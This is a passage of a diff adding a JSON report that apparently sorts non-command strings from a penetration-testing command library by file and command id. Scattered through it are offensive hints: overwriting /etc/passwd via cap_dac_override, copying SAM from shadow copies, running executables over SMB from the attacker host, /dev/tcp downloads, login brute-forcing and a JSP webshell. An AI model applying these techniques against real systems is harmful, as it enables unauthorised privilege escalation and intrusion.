+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "socat-port-forward - Simple relay without authentication",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/pivot-utilities.json",
+            "command_id": "plink-remote-forward",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "socat-port-forward - Set up relay on pivot host",
+        "reason": "Potential command to create",
+        "metadata": {
+          "type": "command_candidate"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/pivoting/proxychains-utilities.json",
+            "command_id": "proxychains-psql",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      }
+    ],
+    "C": [
+      {
+        "text": "Neo4j running",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/active-directory-additions.json",
+            "command_id": "bloodhound-ingest",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "bloodhound-analyze",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Transfer script",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "les-run",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer PrivescCheck.ps1",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/generated/post-exploitation-additions.json",
+            "command_id": "privesccheck-run",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-CimInstance win32_process",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/process-enumeration.json",
+            "command_id": "win-ps-get-process-detailed",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ScheduledTask",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/scheduled-tasks.json",
+            "command_id": "win-schtasks-list-all",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-Process -Id <PID> | Select *",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/monitoring/network-monitoring.json",
+            "command_id": "win-wmic-process-pid",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "# Install ClamAV on Windows test system:\n# Download from: https://www.clamav.net/downloads",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/av-evasion/signature-evasion.json",
+            "command_id": "clamscan-test",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "samba service",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/general-transfer.json",
+            "command_id": "smb-server",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use /dev/tcp for raw download",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-wget",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use -k for self-signed certificates",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-curl",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Run directly: \\\\\\\\<LHOST>\\\\share\\\\file.exe",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-smb",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use base64 encoding for text-safe transfer",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-nc-pull",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use existing file upload functionality",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-php",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use wget/curl if available",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/exfiltration.json",
+            "command_id": "file-transfer-dev-tcp",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use individual PowerUp functions",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-privesc-powerup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual check with: sc qc <servicename>",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-unquoted-service-paths",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-Acl in PowerShell",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-weak-service-perms",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual MSI creation with WiX Toolset",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-always-install-elevated",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ItemProperty for PowerShell",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-registry-autologon",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ScheduledTask in PowerShell",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-scheduled-tasks",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual searchsploit of OS version",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-kernel-exploits",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Copy from Volume Shadow Copies",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "win-sam-system-backup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ADUser $env:USERNAME",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-whoami-privs",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-alwaysinstallelevated",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ScheduledTask | Select TaskName,Principal",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-scheduled-tasks",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-service-permissions",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/windows.json",
+            "command_id": "windows-autologon",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check nmap version: nmap --version (if < 5.21, interactive works)",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-sudo-commands.json",
+            "command_id": "sudo-exploit-nmap",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual review of find output",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+            "command_id": "filter-suid-binaries",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual binary analysis: strings /path/to/binary",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-suid-basic-commands.json",
+            "command_id": "gtfobins-suid-lookup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use LinEnum if LinPEAS fails",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linpeas",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual enumeration with individual commands",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linpeas",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use curl instead of wget",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linenum",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Upload via Python HTTP server",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linenum",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use LinPEAS for more comprehensive scan",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-privesc-linenum",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check /etc/sudoers if readable",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-sudo-list",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual search in /usr/bin and /usr/sbin",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-capabilities",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use LinPEAS which includes capability check",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-capabilities",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use metasploit NFS scanner",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-nfs-no-root-squash",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Transfer manually and run: ./linpeas.sh",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux.json",
+            "command_id": "linux-linpeas",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check specific binary: getcap /usr/bin/python3 (test known binary)",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "enumerate-capabilities",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "enumerate-capabilities",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use linpeas.sh capabilities module for automated classification",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "filter-exploitable-caps",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Search exploit-db for capability-based techniques",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "gtfobins-cap-lookup",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Binary name extracted from getcap output",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "gtfobins-cap-lookup",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use different exploitation technique for same capability/binary",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "execute-cap-exploit",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "GTFOBins technique researched and understood",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "execute-cap-exploit",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "cap-exploit-dac-override-passwd-edit",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/post-exploit/linux-capabilities-commands.json",
+            "command_id": "cap-exploit-dac-override-passwd-edit",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Search SYSVOL for GPP passwords",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-core.json",
+            "command_id": "powerview-get-netgpo",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-NetGroup",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "net-group-domain-list",
+            "field": "alternatives"
+          },
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "dsquery-group",
+            "field": "alternatives"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powershell-ldap.json",
+            "command_id": "ps-directorysearcher-groups",
+            "field": "alternatives"
+          },
+          {
+            "file": "data/commands/enumeration/ad-powershell-ldap.json",
+            "command_id": "ps-ldapsearch-groups",
+            "field": "alternatives"
+          }
+        ],
+        "count": 4
+      },
+      {
+        "text": "Get-ADGroup -Filter *",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "net-group-domain-list",
+            "field": "alternatives"
+          },
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "dsquery-group",
+            "field": "alternatives"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Get-ADUser -Filter *",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-legacy-enumeration.json",
+            "command_id": "dsquery-user",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-nested-group-check-member-type",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual iteration without recursion",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-nested-group-recursive-function",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-get-last-nested-user",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Search patterns: *sql*, *backup*, *service*, *admin*",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-powerview-find-service-accounts",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-nested-groups.json",
+            "command_id": "ps-compare-powerview-versions",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-NetUser -AdminCount",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powershell-ldap.json",
+            "command_id": "ps-ldapsearch-admins",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Capture actual POST data from login form using browser dev tools or Burp Suite",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/tool-specific.json",
+            "command_id": "wfuzz-post-login-brute",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Identify success vs failure response patterns (status code, content, redirect)",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/tool-specific.json",
+            "command_id": "wfuzz-post-login-brute",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Test single manual login attempt first to understand response behavior",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/tool-specific.json",
+            "command_id": "wfuzz-post-login-brute",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Verify interface: ip a",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/tool-specific.json",
+            "command_id": "masscan-full-tcp",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Find gateway: ip route show",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/tool-specific.json",
+            "command_id": "masscan-full-tcp",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Get-Acl",
+        "reason": "PowerShell cmdlet used as instruction",
+        "metadata": {
+          "type": "ps_instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-get-objectacl-forcechangepassword",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/enumeration/ad-powerview-permissions.json",
+            "command_id": "powerview-find-interestingdomainacl",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Download from: https://live.sysinternals.com/PsExec64.exe",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+            "command_id": "psexec-sysinternals",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Impacket installed on Kali",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+            "command_id": "smbexec-impacket-fileless",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "SMB port 445 open",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-psexec.json",
+            "command_id": "smbexec-impacket-fileless",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/ad-lateral-movement-pth.json",
+            "command_id": "pth-impacket-smbexec",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Start Metasploit database: sudo systemctl start postgresql && sudo msfdb init",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "nmap-msf-import",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Manual JSP webshell",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "msfvenom-jsp-war-shell",
+            "field": "alternatives"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Tomcat manager access",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "msfvenom-jsp-war-shell",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Kerberos ticket extracted from memory or forged",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/auto-generated-full-syntax-exploitation.json",
+            "command_id": "rubeus-ptt",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Update ExploitDB: searchsploit -u",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "searchsploit-cve-lookup",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check service fingerprint manually",
+        "reason": "State condition - not a command",
+        "metadata": {
+          "type": "state_condition"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "searchsploit-service-version",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Find exploit first: searchsploit <SERVICE> <VERSION>",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "searchsploit-copy-exploit",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Identify target service and port",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nmap-script-help",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Identify required arguments from help",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nmap-script-args",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "gobuster-dir-common",
+            "field": "prerequisites"
+          },
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "nikto-comprehensive",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 2
+      },
+      {
+        "text": "Check robots.txt first: curl http://<TARGET>/robots.txt",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "gobuster-dir-common",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Note web server type from nmap: Apache, IIS, nginx",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "gobuster-dir-common",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Identify web technology: whatweb http://<TARGET>",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "gobuster-dir-custom",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
+        "text": "Check for rate limiting: Test with small wordlist first",
+        "reason": "Instruction text - not a command",
+        "metadata": {
+          "type": "instruction"
+        },
+        "occurrences": [
+          {
+            "file": "data/commands/exploitation/general.json",
+            "command_id": "gobuster-dir-custom",
+            "field": "prerequisites"
+          }
+        ],
+        "count": 1
+      },
+      {
